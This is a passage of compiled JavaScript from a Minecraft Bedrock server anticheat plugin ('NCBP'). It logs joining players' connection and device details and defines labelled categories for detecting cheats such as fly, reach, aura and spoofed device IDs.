    (0, fs_1.mkdirSync)('../NCBPLog');
}

if (exports.JoinLog) {
    event_1.events.packetAfter(1).on((ptr, networkIdentifier, packetId) => {
        const ip = networkIdentifier.getAddress().split("|")[0]; const port = networkIdentifier.getAddress().split("|")[1]; const connreq = ptr.connreq; if (connreq === null)
            return; const cert = connreq.getCertificate(); const xuid = cert.getXuid(); const username = cert.getId(); let model = connreq.getJsonValue()["DeviceModel"]; const deviceid = connreq.getDeviceId(); if (model == null || model == "") {
                model = "No Model";
            }; let rawtext = "";
        if (connreq.getDeviceOS() === 7) rawtext = "Motherboard"; info(colors_1.yellow(`${username}: IP: ${ip}, Port: ${port}, XUID: ${xuid || "None"}, OS: ${common_1.BuildPlatform[connreq.getDeviceOS()] || 'Unknown'}, ${rawtext || "Model"}: ${model}, ID: ${deviceid}`));
    });
}
;
event_1.events.serverClose.once(() => { process.exit(0); });
info("[NCBP] 해당 서버는 NCBP Anticheat 를 사용중입니다".green);
info("[NCBP] Made by jobgutworlds".yellow);
info("[NCBP]" + ` ${AntiCheatVersion}`.magenta);
event_1.events.serverLeave.on(() => { info("[NCBP] Anticheat Deactivated".red); info("[NCBP] Made By jobgutworlds".yellow); });

var AntiCheat;
(function (AntiCheat) {
    let Crasher;
    (function (Crasher) {
        let InvalidPosition;
        (function (InvalidPosition) {
            InvalidPosition["name"] = "Crasher";
            InvalidPosition["description"] = "Moved to Invalid Position";
        })(InvalidPosition = Crasher.InvalidPosition || (Crasher.InvalidPosition = {}));
        ;
        let InvalidSoundPacket;
        (function (InvalidSoundPacket) {
            InvalidSoundPacket["name"] = "Crasher";
            InvalidSoundPacket["description"] = "Invalid Level Sound Packet";
        })(InvalidSoundPacket = Crasher.InvalidSoundPacket || (Crasher.InvalidSoundPacket = {}));
        ;
        let FoodSpammer;
        (function (FoodSpammer) {
            FoodSpammer["name"] = "Crasher";
            FoodSpammer["description"] = "Spamming Eating Packets";
        })(FoodSpammer = Crasher.FoodSpammer || (Crasher.FoodSpammer = {}));
        ;
        let IllegalPacket;
        (function (IllegalPacket) {
            let PurchaseReceipt;
            (function (PurchaseReceipt) {
                PurchaseReceipt["name"] = "Crasher";
                PurchaseReceipt["description"] = "Illegal PurchaseReceipt Packet";
            })(PurchaseReceipt = IllegalPacket.PurchaseReceipt || (IllegalPacket.PurchaseReceipt = {}));
            ;
        })(IllegalPacket = Crasher.IllegalPacket || (Crasher.IllegalPacket = {}));
        ;
    })(Crasher = AntiCheat.Crasher || (AntiCheat.Crasher = {}));
    ;
    let Movement;
    (function (Movement) {
        let Fly;
        (function (Fly) {
            let A;
            (function (A) {
                A["name"] = "Fly-A";
                A["description"] = "Glide on Air";
            })(A = Fly.A || (Fly.A = {}));
            ;
            let B;
            (function (B) {
                B["name"] = "Fly-B";
                B["description"] = "No Y Changes";
            })(B = Fly.B || (Fly.B = {}));
            ;
            let C;
            (function (C) {
                C["name"] = "Fly-C";
                C["description"] = "Jetpack or Jump on Air";
            })(C = Fly.C || (Fly.C = {}));
            let E;
            (function (E) {
                E["name"] = "Fly-E";
                E["description"] = "invalid Position Fly Packet";
            })(E = Fly.E || (Fly.E = {}));
            ;
            let F;
            (function (F) {
                F["name"] = "Fly-F";
                F["description"] = "Fake Elytra Packet";
            })(F = Fly.F || (Fly.F = {}));
            ;
            let G;
            (function (G) {
                G["name"] = "Fly-G";
                G["description"] = "Zephyr radon Fly mode";
            })(G = Fly.G || (Fly.G = {}));
        })(Fly = Movement.Fly || (Movement.Fly = {}));
        ;
        let Speed;
        (function (Speed) {
            Speed["name"] = "Speed";
            Speed["description"] = "increase Speed";
        })(Speed = Movement.Speed || (Movement.Speed = {}));
        ;
        let Teleport;
        (function (Teleport) {
            Teleport["name"] = "Teleport";
            Teleport["description"] = "Teleported";
        })(Teleport = Movement.Teleport || (Movement.Teleport = {}));
        ;
    })(Movement = AntiCheat.Movement || (AntiCheat.Movement = {}));
    ;
    let Misc;
    (function (Misc) {
        let FakeInventoryChange;
        (function (FakeInventoryChange) {
            FakeInventoryChange["name"] = "illegal Giving";
            FakeInventoryChange["description"] = "Fake InventoryTransAction Packet";
        })(FakeInventoryChange = Misc.FakeInventoryChange || (Misc.FakeInventoryChange = {}));
        ;
        let FakeXP;
        (function (FakeXP) {
            FakeXP["name"] = "Fake XP Packet";
            FakeXP["description"] = "Give XP using illegal method";
        })(FakeXP = Misc.FakeXP || (Misc.FakeXP = {}));
        ;
        let FakeOS;
        (function (FakeOS) {
            let Phone;
            (function (Phone) {
                Phone["name"] = "Fake OS";
                Phone["description"] = "Spoof their OS | Real OS : Android or IOS";
            })(Phone = FakeOS.Phone || (FakeOS.Phone = {}));
            ;
            let Win10;
            (function (Win10) {
                Win10["name"] = "Fake OS";
                Win10["description"] = "Spoof their OS | Real OS : Windows 10";
            })(Win10 = FakeOS.Win10 || (FakeOS.Win10 = {}));
            ;
        })(FakeOS = Misc.FakeOS || (Misc.FakeOS = {}));
        ;
        let Toolbox;
        (function (Toolbox) {
            Toolbox["name"] = "Toolbox";
            Toolbox["description"] = "Join with Toolbox Program";
        })(Toolbox = Misc.Toolbox || (Misc.Toolbox = {}));
        ;
        let FakeDeviceID;
        (function (FakeDeviceID) {
            let IllegalDeviceID;
            (function (IllegalDeviceID) {
                IllegalDeviceID["name"] = "illegal DeviceID";
                IllegalDeviceID["description"] = "Fake DeviceID Packet";
            })(IllegalDeviceID = FakeDeviceID.IllegalDeviceID || (FakeDeviceID.IllegalDeviceID = {}));
            ;
            let InvalidDeviceID;
            (function (InvalidDeviceID) {
                InvalidDeviceID["name"] = "Horion Client";
                InvalidDeviceID["description"] = "Horion DeviceID Spoof | Catch Module Error";
            })(InvalidDeviceID = FakeDeviceID.InvalidDeviceID || (FakeDeviceID.InvalidDeviceID = {}));
            ;
            let StrangeDeviceID;
            (function (StrangeDeviceID) {
                StrangeDeviceID["name"] = "Zephyr Client";
                StrangeDeviceID["description"] = "Zephyr DeviceID Spoof | Catch Module Issue";
            })(StrangeDeviceID = FakeDeviceID.StrangeDeviceID || (FakeDeviceID.StrangeDeviceID = {}));
            ;
        })(FakeDeviceID = Misc.FakeDeviceID || (Misc.FakeDeviceID = {}));
        ;
        let FakeName;
        (function (FakeName) {
            let IllegalName;
            (function (IllegalName) {
                IllegalName["name"] = "illegal Name";
                IllegalName["description"] = "Spoof their Name";
            })(IllegalName = FakeName.IllegalName || (FakeName.IllegalName = {}));
            ;
            let InvalidName;
            (function (InvalidName) {
                InvalidName["name"] = "invalid Name";
                InvalidName["description"] = "No Nickname";
            })(InvalidName = FakeName.InvalidName || (FakeName.InvalidName = {}));
        })(FakeName = Misc.FakeName || (Misc.FakeName = {}));
        ;
        let Spammer;
        (function (Spammer) {
            let Zephyr;
            (function (Zephyr) {
                Zephyr["name"] = "Spammer";
                Zephyr["description"] = "Zephyr Spammer";
            })(Zephyr = Spammer.Zephyr || (Spammer.Zephyr = {}));
            ;
            let Horion;
            (function (Horion) {
                Horion["name"] = "Spammer";
                Horion["description"] = "Horion Spammer";
            })(Horion = Spammer.Horion || (Spammer.Horion = {}));
            ;
        })(Spammer = Misc.Spammer || (Misc.Spammer = {}));
        ;
        let InvisibleSkin;
        (function (InvisibleSkin) {
            InvisibleSkin["name"] = "illegal Skin";
            InvisibleSkin["description"] = "illegal Skin";
        })(InvisibleSkin = Misc.InvisibleSkin || (Misc.InvisibleSkin = {}));
        ;
        let BadPacket;
        (function (BadPacket) {
            let SelfHit;
            (function (SelfHit) {
                SelfHit["name"] = "Bad Packet";
                SelfHit["description"] = "Self Hit";
            })(SelfHit = BadPacket.SelfHit || (BadPacket.SelfHit = {}));
            ;
            let UnUsedPacket;
            (function (UnUsedPacket) {
                UnUsedPacket["name"] = "Bad Packet";
                UnUsedPacket["description"] = "Sended unused packet";
            })(UnUsedPacket = BadPacket.UnUsedPacket || (BadPacket.UnUsedPacket = {}));
            ;
            let IllegalChatType;
            (function (IllegalChatType) {
                IllegalChatType["name"] = "Bad Packet";
                IllegalChatType["description"] = "Strange chat type";
            })(IllegalChatType = BadPacket.IllegalChatType || (BadPacket.IllegalChatType = {}));
            ;
            let MismatchChatName;
            (function (MismatchChatName) {
                MismatchChatName["name"] = "Bad Packet";
                MismatchChatName["description"] = "Mismath Names(on Text Packet)";
            })(MismatchChatName = BadPacket.MismatchChatName || (BadPacket.MismatchChatName = {}));
            ;
        })(BadPacket = Misc.BadPacket || (Misc.BadPacket = {}));
        ;
    })(Misc = AntiCheat.Misc || (AntiCheat.Misc = {}));
    ;
    let World;
    (function (World) {
        let Instabreak;
        (function (Instabreak) {
            let A;
            (function (A) {
                A["name"] = "instabreak-A";
                A["description"] = "No Delay to break Block";
            })(A = Instabreak.A || (Instabreak.A = {}));
        })(Instabreak = World.Instabreak || (World.Instabreak = {}));
        ;
        let Nuker;
        (function (Nuker) {
            Nuker["name"] = "Nuker";
            Nuker["description"] = "No Delay to break Block";
        })(Nuker = World.Nuker || (World.Nuker = {}));
        ;
        let Scaffold;
        (function (Scaffold) {
            Scaffold["name"] = "Scaffold";
            Scaffold["description"] = "Mismatched head rotation";
        })(Scaffold = World.Scaffold || (World.Scaffold = {}));
        ;
    })(World = AntiCheat.World || (AntiCheat.World = {}));
    ;
    let Combat;
    (function (Combat) {
        let Reach;
        (function (Reach) {
            Reach["name"] = "Reach";
            Reach["description"] = "increase Reach";
        })(Reach = Combat.Reach || (Combat.Reach = {}));
        ;
        let Aura;
        (function (Aura) {
            Aura["name"] = "Aura";
            Aura["description"] = "Mismatch head rotation or attack through wall";
        })(Aura = Combat.Aura || (Combat.Aura = {}));
        ;
        let Velocity;
        (function (Velocity) {
            Velocity["name"] = "Velocity";
            Velocity["description"] = "Reduce knockback";
        })(Velocity = Combat.Velocity || (Combat.Velocity = {}));
        ;
    })(Combat = AntiCheat.Combat || (AntiCheat.Combat = {}));
    ;
    let Player;
    (function (Player) {
        let ChestStealer;
        (function (ChestStealer) {
            ChestStealer["name"] = "ChestStealer";
            ChestStealer["description"] = "Too fast taking items from chest";
        })(ChestStealer = Player.ChestStealer || (Player.ChestStealer = {}));
        ;
    })(Player = AntiCheat.Player || (AntiCheat.Player = {}));
    ;
})(AntiCheat = exports.AntiCheat || (exports.AntiCheat = {}));
;
setInterval(() => {
    checkversion();
}, 30000);
